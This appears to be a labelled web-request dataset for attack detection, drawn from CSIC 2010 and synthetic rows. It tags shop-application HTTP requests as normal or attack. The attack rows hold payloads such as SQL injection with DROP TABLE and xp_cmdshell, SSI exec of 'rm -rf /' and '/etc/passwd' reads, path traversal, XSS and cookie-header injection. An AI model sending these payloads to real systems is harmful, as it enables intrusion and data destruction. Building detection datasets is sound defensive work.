+GET /tienda1/miembros/editar.jsp?modo=%253F&login=manahil&password=festero&nombre=Cassandra&apellidos=Bakero&email=suleiman_bergstrom%40magichobby.np&dni=78556514Z&direccion=Calle+Seguirillas+127%2C+12%3FD&ciudad=Vadillo+de+la+Sierra&cp=20740&provincia=Palencia&ntc=9716883753847934&B1=Registrar,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=eamonn&password=46og7ero&nombre=Ludovico&apellidos=Rambla+Jalencas&email=gondel_jansen%40andrestabernero.mo&dni=33581223G&direccion=Calle+Napoles%2C+86%2C+&ciudad=Sant+Salvador+de+Guardiola&cp=25520&provincia=Toledo&ntc=3505779017401653&B1=Registrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=mebine&password=L16o2o&nombre=Filis&apellidos=Antih+Sacido&email=rosenblatt%40hormigon-impreso.az&dni=00699529F&direccion=Plaza+Pe%F1a+Gudina%2C+14%2C+&ciudad=San+Vicente+de+Ar%E9valo&cp=06660&provincia=Tarragona&ntc=8741178125642533&B1=Registrar,normal,csic2010
+GET /IISSamples/sdk/asp/docs/sampfram.asp,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=3%2F&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=75&B1=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/publico/caracteristicas.jsp BODY: id=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=lollis&pwd=s%27%2Fab%2Fa%F1%F3n&remember=off&B1=Entrar,attack,csic2010
+POST /profile BODY: file=drop me a message,normal,synthetic
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=chuanhsi&pwd=b129a97r&remember=on&B1=Entrar,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=ganness&password=5edi77o&nombre=Feladelfa&apellidos=Soteres+Escalona&email=barsoe%4016horas.ba&dni=85880127J&direccion=La+Parranda+181+&ciudad=Cosuenda&cp=21220&provincia=C%E1diz&ntc=5729303766041387&B1=Registrar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=barkwill8&pwd=cagafierro&remember=on&B1=Entrar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=sanabria&pwd=s074ido3&remember=on&B1=Entrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=winnah&pwd=POlvORADuQue&remember=off&B1=Entrar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=5709&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=pakulski&pwd=5ECOm058a%3F8A&remember=on&B1=Entrar,normal,csic2010
+POST /profile BODY: comment=%27%3B%20eXEc%20xp_CMDshELl%28%27dir%27%29%3B--,attack,synthetic
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=8547&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=tomohiro&pwd=cacoquimia&remember=off&B1=%27INJECTED_PARAM,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modoA=insertar&precio=5521&B1=Pasar+por+caja,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=fowler-h&pwd=0isi%F33&remember=on&B1=Entrar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=bijman3&pwd=enviada&remember=off&B1=Entrar,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=optimiza&password=cepr%E9n&nombre=Pr%F3spero&apellidos=Depalol+Murrugarra&email=fay%40catanoticias.nc&dni=38064201Y&direccion=Velazquez%2C+142%2C+&ciudad=Llers&cp=25700&provincia=Toledo&ntc=9075049158743029&B1=Registrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=ianthe&password=e4pi96a3&nombre=Leocadio&apellidos=Guimarey+G%E1llego&email=fall.bosacker%40redhost.ie&dni=12852429Y&direccion=Calle+Gran+Poder%2C+35+10G&ciudad=Masies+de+Roda%2C+Les&cp=09450&provincia=Madrid&ntc=9118174578374133&B1=Registrar,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=perceval&passwordA=tin86&nombre=Parmenio&apellidos=D%27Molino+Bocas&email=jay%40almascanarias.wf&dni=96398598D&direccion=Lepant+33%2C+&ciudad=Benuza&cp=26560&provincia=Guadalajara&ntc=2171179152751946&B1=Registrar,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=j%27ill%27ayne&password=vOL6%C16iCa&nombre=Justa&apellidos=Catalan+Mediero&email=covan-giftos%40monnal.so&dni=96303004A&direccion=Calle+Otero+Blas+De+35+4F&ciudad=Molacillos&cp=25670&provincia=C%E1ceres&ntc=4578401748982547&B1=Registrar,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=1&nombre=Queso+Manchego&precioA=39&cantidad=94&B1=A%F1adir+al+carrito,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=3499&B1=Pasar+por+caja,normal,csic2010
+GET /tienda1/publico/autenticar.jsp.BAK,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=marice&pwd=ar2e5tad6&remember=off&B1=Entrar,normal,csic2010
+GET /tienda1/imagenes/nuestratierra.jpg/asf-logo-wide.java,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=zampino&pwd=mILonGa&remember=on%2F&B1=Entrar,attack,csic2010
+POST /profile BODY: email=alice,normal,synthetic
+POST /search BODY: q=Tom & Jerry,normal,synthetic
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=babatund&password=pA6OMer9-A&nombre=Juana+del+Pilar&apellidos=Luna+Barberan&emailA=mazurowna%40wdsl.om&dni=19546963E&direccion=Villadangos+Del+Paramo%2C+82%2C+&ciudad=Encinas+de+Esgueva&cp=10830&provincia=Alicante&ntc=5365738910346806&B1=Registrar,attack,csic2010
+GET /tienda1/publico/anadir.jsp?id=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&nombre=Vino+Rioja&precio=85&cantidad=60&B1=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=3&nombre=Vino+Rioja&precio=85&cantidad=26&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=conroy7&pwd=nordes%21tal&remember=off&B1=Entrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=waloff&password=ENemistad&nombre=Lucario&apellidos=Sansa+Cardalliaguet&email=malik%40clubdeviaje.so&dni=35404149L&direccion=Calle+Roldana%2C+132%2C+&ciudad=Puigcerd%E0&cp=03517&provincia=Segovia&ntc=5044663999765334&B1=Registrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=levon&pwd=ca%F1ucela%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&remember=on&B1=Entrar,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=gunn&password=D88Ino&nombre=Nuncia&apellidos=Badell+Macia&email=vydra%40sms24h.no&dni=4B1319B30B2D&direccion=C%2F+Closa+De+Torroja+S%2FN+12-B&ciudad=Loiu&cp=12580&provincia=Asturias&ntc=9649891877150082&B1=Registrar,attack,csic2010
+POST /comment BODY: user=....//....//etc/passwd,attack,synthetic
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=9637&B1=Pasar+por+caja,normal,csic2010
+POST /login BODY: id=union station timings,normal,synthetic
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=7636&B1=Confirmar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=doris&password=pu6ue97&nombre=Wanda&apellidos=Bergad%E0+Faix%F3&email=sibirskaia%40euskalcasino.es&dni=72367579B&direccion=C%2F+Lope+De+Rueda+S%2FN%2C+9-F&ciudad=Alc%F3ntar&cp=34259&provincia=Segovia&ntc=1721278325772936&B1=Registrar,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=30&B1=Pasar+por+caja%2F,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=4451&B1=Pasar+por+caja,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=nolen&passwordA=permanenteme*nte&nombre=Atila&apellidos=Ingla+Campaner&email=schollwer.stoddard%40zeat.ms&dni=99500842J&direccion=Serafin%2C+65+9-B&ciudad=Castrillo-Tejeriego&cp=22792&provincia=Tarragona&ntc=8835278946526416&B1=Registrar,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=2%2F&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=5&B1=A%F1adir+al+carrito,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=d%2Fmsrtime&pwd=5872ra&remember=off&B1=Entrar,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=dionysus&pwd=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&remember=on&B1=Entrar,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=lanoszka&password=si1ovi3&nombre=Lautaro&apellidos=Desplans&email=macdougall_laurier%40rocofer.am&dni=17218977G&direccion=C%2F+Juan+Perez+Arriete+19+13E&ciudad=M%E9lida&cp=39694&provincia=Barcelona&ntc=9302322356246829&B1=Registrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=marten&password=esP2G7n&nombre=Manuel&apellidos=Yagual+Withmory&email=hurt%40carimartin.ba&dni=66367222D&direccion=Fresno+De+Torote%2C+193+2%3FH&ciudad=Sena&cp=19490&provincia=Cuenca&ntc=4099696092188089&B1=Registrar,normal,csic2010
+POST /contact BODY: email='; EXEC xp_cmdshell('dir');--,attack,synthetic
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=ba%3Fb%2Cbie&password=eSOT%C9R2ca&nombre=Fede&apellidos=Romera+Zuleta&email=dacgnault%40ajuntamentbarcelona2-0.name&dni=34382308E&direccion=C%2F+Cuellar+177+&ciudad=Albalate+de+las+Nogueras&cp=24915&provincia=Segovia&ntc=8975566519527853&B1=Registrar,attack,csic2010
+GET /contact?file=admin,normal,synthetic
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=4787&B1=Confirmar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=eoin&password=H8bEr&nombre=Robertino&apellidos=Sintes+Novoa&email=rix.piljeckaja%40waterflyesp.be&dni=24604865V&direccion=C%2F+Barri+Del+Polvori%2C+77+&ciudad=Aldehuela+de+Yeltes&cp=05365&provincia=Guadalajara&ntc=9228046254742614&B1=Registrar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=8570&B1=Pasar+por+caja,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modoA=entrar&login=dokken8&pwd=PaRLaNch%EDn&remember=off&B1=Entrar,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=1&nombre=Vino+Rioja&precio=85&cantidad=65&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=przewloc&pwd=maste&remember=on&B1=Entrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=caridad&pwd=r1m2samente&remember=on&B1=Entrar,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=3615&B1=Pasar+por+caja,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=2%2F&nombre=Queso+Manchego&precio=39&cantidad=98&B1=A%F1adir+al+carrito,attack,csic2010
+GET /comment?name=admin,normal,synthetic
+GET /tienda1/global/titulo.jsp/asf-logo-wide.gif,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=9791&B1=Confirmar,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=jozef&password=ve9dErse&nombre=Tahiel&apellidos=Ortiz+Narvarte&email=lemontier%40viajesnacionales.kp&dni=70721027Y&direccion=Calle+Virgen+De+La+Hoz%2C+123+4-B&ciudad=Borrass%E0%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&cp=44564&provincia=Zaragoza&ntc=7002955624204925&B1=Registrar,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=berry&pwd=br4836cer&remember=off&B1=Entrar,normal,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=6&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=robbie&password=7nexor40ilidad&nombre=Milet&apellidos=Alles+Araujo&email=adix_adam%40easyviaggio.com.km&dni=56876585T&direccion=Calle+Juan+Montilla%2C+50+1-A&ciudad=Paterna&cp=45870%27+DELETE+FROM+USERS&provincia=Navarra&ntc=9173328900592385&B1=Registrar,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=ye-sho&password=suscripta&nombre=Hans&apellidos=Steinle+Funk&email=maxey%40karldeux.cg&dni=12345246L&direccion=Guatemala%2C+123%2C+5-H&ciudad=Caraba%F1a&cp=46139&provincia=Barcelona&ntc=0198594046375467&B1=Registrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=%27d*al%3Fia&password=M5x0E&nombre=Nimsi&apellidos=Cat%E0+Viera&email=talbot_polani%40clichotel.sj&dni=56967582D&direccion=Avenida+Industria+48%2C+12H&ciudad=Sant+Mart%ED+de+Riucorb&cp=44124&provincia=Zaragoza&ntc=5246598463194503&B1=Registrar,attack,csic2010
+GET /tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=100%2F&cantidad=57&B1=A%F1adir+al+carrito,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=tsuji&password=envergonzado&nombre=Stylianos&apellidos=Franco+Vilamaj%F3&email=kraa%40pablobracamonte.ls&dni=65643274D&direccion=La+Pradera+131%2C+10E&ciudad=Burjassot&cp=18615&provincia=Zaragoza&ntc=715846118284922&B1=Registrar,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=7144&B1=Confirmar%2F,attack,csic2010
+POST /contact BODY: page=new york,normal,synthetic
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=31&B1A=Confirmar,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registroSet-cookie%253A%2BTamper%253D1041264011025374727&login=chatchai&password=chismorrear&nombre=Rachid&apellidos=Mingo+Elbaile&email=schkorski%40elxxi.zr&dni=26852714F&direccion=Paraguay%2C+88%2C+5%3FE&ciudad=Aulesti&cp=31754&provincia=La+Rioja&ntc=2647099047093404&B1=Registrar,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=eleni&password=DE5pe%F1AdurA&nombre=Zahira&apellidos=Monteoliva+Pag%E8s&email=stimson_holbrook%40cementosanfranq.ly&dni=02005072R&direccion=Vicari+Joan+Catany+123+1%3FC&ciudad=Y%E9sero&cp=42172&provincia=Badajoz&ntc=3547056406235223&B1=Registrar,normal,csic2010
+GET /tienda1/imagenes/1.gif.Old,attack,csic2010
+GET /tienda1/publico/caracteristicas.jsp?id=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=3&nombre=Vino+Rioja&precio=85%2F&cantidad=7&B1=A%F1adir+al+carrito,attack,csic2010
+GET /tienda1/publico/vaciar.jsp?B2=%257C,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=cassat&password=g0l4&nombre=Alfio&apellidos=Putrino+Escortell&email=baretto0%40drae2.tk&dni=30218134K&direccion=C%2F+Poeta+Bernardo+De+La+Torre+10%2C+&ciudad=Cambrils&cp=43364&provincia=Salamanca&ntc=4271773841923976&B1=Registrar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=jabir&pwd=caMbiazo&remember=on&B1=Entrar,normal,csic2010
+POST /download BODY: email=| dIR C:\,attack,synthetic
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&loginA=skef&pwd=p9o832o50&remember=off&B1=Entrar,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=please_d&pwd=afablemente&remember=off&B1=Entrar,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=6494&B1=Pasar+por+caja%2F,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=bagnato33&password=prescindible&nombre=Hiram%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&apellidos=Penagos+Pijoan&email=fenell%40salsaspain.fr&dni=11130412E&direccion=C%2F+Leon+Pinelo%2C+5+3E&ciudad=Cordovilla&cp=10320&provincia=Navarra&ntc=2582130639764727&B1=Registrar,attack,csic2010
+GET /tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=85&cantidad=9&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=7&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=8036any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&B1=Pasar+por+caja,attack,csic2010
+GET /tienda1/publico/pagar.jsp/asf-logo-wide.gif/,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=winsberg&password=flagicio&nombre=Lihuel&apellidos=Novell+Abenoza&email=hasserman%40clinicadentalsansalvador.ua&dni=95659491F&direccion=Federico+Garcia+Lorca%2C+132%2C+&ciudad=Riudoms&cpA=36960&provincia=Burgos&ntc=1343774789684603&B1=Registrar,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=horak&password=6eSi74osO&nombre=Blas&apellidos=Gasca+Noria&email=dearden%40hipermadrid.ga&dni=01101234V&direccion=Avenida+Comunidad+De+Madrid+45%2C+13C&ciudad=Villarreal+de+Huerva%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&cp=01170&provincia=Girona&ntc=1336518549569700&B1=Registrar,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=3489&B1=Pasar+por+caja,normal,csic2010
+GET /download?file=..\..\winDOWS\wIN.iNI,attack,synthetic
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=raimund&password=*eS8a24l&nombre=J%E9sica&apellidos=Casavieja+Carriquiri&email=elder%40parcalia.hn&dni=38847166M&direccion=Calle+Laguna+De+Pe%F1alara+171+12-E&ciudad=Aldea+de+San+Nicol%E1s%2C+La&cp=06460&provincia=C%E1ceres&ntc=1710045357867718&B1=Registrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=fallah&password=sindicable&nombre=Fabia&apellidos=Rom%E0+Subir%F3n&email=segar%40contactomujeres.nc&dni=64964263G&direccion=Ortiz+De+Zarate+32%2C+&ciudad=Petrer&cp=49331&provincia=Badajoz&ntc=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&B1=Registrar,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=loewen&password=ovIl&nombre=Reagan&apellidos=Piulachs+Casaramon&email=diogene%40acch-portugal.mq&dni=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&direccion=C%2F+Huesca%2C+171+&ciudad=Luz%F3n&cp=15863&provincia=Valladolid&ntc=0586261319391409&B1=Registrar,attack,csic2010
+GET /tienda1/miembros/editar.jsp.BAK,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=mcminn&password=d8eci78e88a1a&nombre=Adoraci%F3n&apellidosA=Gorrias&email=rice-davies%40somagel.mc&dni=72553689M&direccion=Plza.+Virgen+Del+Carmen+197%2C+&ciudad=Fresno+de+Caracena&cp=25191&provincia=Valladolid&ntc=4132924847990257&B1=Registrar,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=ghadisha&password=9scantador&nombre=Aureliano&apellidos=Luggren+Bedmar&email=dozier%40interanuncios.li&dni=31673984V&direccion=Calle+Estrella+Acamar+60%2C+&ciudad=Padules&cp=22250&provincia=%C1vila&ntc=2214886368001325&B1=Registrar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=emilie&pwd=ins33l0c205&remember=on&B1=Entrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=minette&password=aseguir&nombre=Tel%E9maco&apellidos=Poblete+Fiuza&email=messenger%40blanquillos.pk&dni=76591879Q&direccion=Calle+Orion+74%2C+&ciudad=Villazala&cp=26291&provincia=Ja%E9n&ntc=0861204544361308&B1=Registrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=guillory&pwd=Arme%21LlUElA&remember=on&B1=Entrar,normal,csic2010
+GET /view?name=%27%3B%20exeC%20xP_cMDSHeLL%28%27dir%27%29%3B--,attack,synthetic
+GET /tienda1/miembros/editar.jsp?modo=registro&login=fikis8&password=apret%F3n&nombre=Crisp%EDn&apellidos=Legarreta+Sant&email=carlo_salcedo4%40nomao.wf&dni=42520233H&direccion=Calle+Sant+Erasme%2C+81+&ciudad=Enc%EDo&cp=37217&provincia=Burgos&ntc=0184493259280421&B1=Registrar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=7436&B1=Pasar+por+caja%2F,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=sameh&password=encara&nombre=Marcelino&apellidosA=Mundo+Osarte&email=vanni%40sietepeines.eu&dni=76973319R&direccion=C%2F+Eugenio+Arbones%2C+84%2C+9-G&ciudad=Daya+Vieja&cp=43770&provincia=Barcelona&ntc=7672564317265745&B1=Registrar,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=thorson&password=CORruptivo&nombre=Buenaventura&apellidos=Heuvan+Llad%F3s&email=dear_terr%40nikemujeres.sc&dni=98458584T&direccion=Calle+La+Rabida+31%2C+&ciudad=Villamandos&cp=37115&provincia=Burgos&ntc=2511625444669752&B1=Registrar,normal,csic2010
+GET /profile?file=../../etc/passwd,attack,synthetic
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=1972&B1=Confirmar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=lorrayne&password=anofele6&nombre=Neliana&apellidos=Monllor+Mascort&email=tsaganeas%40mccomptables.my&dni=26431261Y&direccion=Calle+Begonia+47%2C+&ciudad=Recuenco%2C+El&cp=44168&provincia=Guad%3Fala%2Fjar%3Fa&ntc=7168408229054610&B1=Registrar,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=arnold&password=5na.0m7gR5D2&nombre=Marcelino&apellidos=Bi%2Bffi&email=figueras-haufrect%40freetag.no&dni=72263814E&direccion=C%2F+Catalanes+84+13E&ciudad=Talamanca&cp=26573&provincia=Soria&ntc=9766753613033509&B1=Registrar,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=hainline4&password=M9a&nombre=Dayan&apellidos=Aldeta+Marnetti&email=chanel_ismael%40conac.com.ie&dni=98027307L&direccion=C%2F+Abeja%2C+S%2FN+&ciudad=Navalacruz&cp=24740&provinciaA=Segovia&ntc=1385468393912662&B1=Registrar,attack,csic2010
+GET /tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=85&cantidad=9&B1=A%F1adir+al+carrito,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=wai&passwordA=venecianO&nombre=Esdras&apellidos=Alabart&email=dudicourt%40viajessolomujeres.travel&dni=28316047B&direccion=Motril%2C+128+&ciudad=A%F1e&cp=40330&provincia=Guadalajara&ntc=0070151205403865&B1=Registrar,attack,csic2010
+GET /tienda1/publico/caracteristicas.jsp/asf-logo-wide.gif.inc,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=anatoli&pwd=lavada&remember=on&B1=Entrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=hamavand&password=6oroso&nombre=Desd%E9mona&apellidos=Veliz+Gaya&email=lenauer%40buscamoto.bg&dni=91270497B&direccion=Music+Josep+Carbonell%2C+93+&ciudad=Naval&cp=46315&provincia=C%F3rdoba&ntc=1701163791515432&B1=Registrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=lussier&pwd=1Ch%3FU07l6A&remember=off&B1=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&loginA=banerjee&pwd=i1ic-%EDneo&remember=on&B1=Entrar,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=544&B1=Confirmar,normal,csic2010
+GET /login?q=images/logo.png,normal,synthetic
+POST /tienda1/publico/caracteristicas.jsp BODY: id=1%22+AND+%221%22%3D%221,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=1633&B1=Pasar+por+caja,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=7173&B1=Confirmar,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=1&nombreA=Vino+Rioja&precio=85&cantidad=43&B1=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precioA=4486&B1=Pasar+por+caja,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=1230&B1=Pasar+por+caja,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=xiaofeng&pwd=e88u7i5&remember=on&B1=Entrar,normal,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=2&nombre=Vino+Rioja&precioA=100&cantidad=86&B1=A%F1adir+al+carrito,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=pammie&password=V%24Idr3Ar&nombre=Sayara&apellidos=Cagnoli&email=clavering%40pinturasultravioleta.pro&dni=63829565B&direccion=Aurora+Bertrana+Salazar+10+3-C&ciudad=Hornos&cp=45634&provincia=Valladolid&ntc=4226046499602528&B1=Registrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=charles2&password=b8z7&nombreA=Rufo&apellidos=Gusmerini+Aguado&email=firshman%40softwaresaas.gn&dni=11831280B&direccion=Ferreries+141%2C+9D&ciudad=Robledillo+de+Mohernando&cp=41820&provincia=Lleida&ntc=8924971122572186&B1=Registrar,attack,csic2010
+GET /tienda1/publico/anadir.jsp?idA=3&nombre=Vino+Rioja&precio=100&cantidad=20&B1=A%F1adir+al+carrito,attack,csic2010
+GET /profile?user=blue shirt,normal,synthetic
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=wallace&password=tucurpilla&nombre=Juanita&apellidos=Simonetti+Campam%E0&email=mowery%40sayuela.ph&dni=49682962H&direccion=Sicilia+159+&ciudad=Alcubillas&cp=08736&provincia=Ja%E9n&ntc=3071106416830045&B1=Registrar%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=espinosa&pwdA=candado&remember=off&B1=Entrar,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=5242&B1=Confirmar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar%27+AND+%271%27%3D%271&login=kaidanne&pwd=d67198taD4r6&remember=on&B1=Entrar,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=7756&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=mcnair&pwd=81cob6r&remember=off%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&B1=Entrar,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=elia6&password=Se5AP62o&nombre=Gamal&apellidos=Cot+Reixach&email=bianchi%40atrioregalos.im&dni=05684753G&direccion=Perez+Pujol%2C+112%2C+3G&ciudad=Victoria%2C+La&cp=08930&provincia=Lleida&ntc=1002172418275885&B1=Registrar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=sheng-fu&pwd=sentimenta%2Flmen%27%2Cte&remember=on&B1=Entrar,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=2814&B1A=Confirmar,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&login=maudie&password=cegaTo%3Fso&nombre=Yured&apellidos=Modrego+Aylagas&email=natzler.machiavelli%40francislucille.cy&dni=68096192T&direccion=C%2F+Carlos+De+La+Rica%2C+8+11%3FA&ciudad=Puigverd+d%27Agramunt&cp=08672&provincia=Palencia&ntc=6396253761051262&B1=Registrar,attack,csic2010
+GET /tienda1/publico/caracteristicas.jsp.OLD,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=291&B1A=Pasar+por+caja,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=3486&B1=Confirmar,normal,csic2010
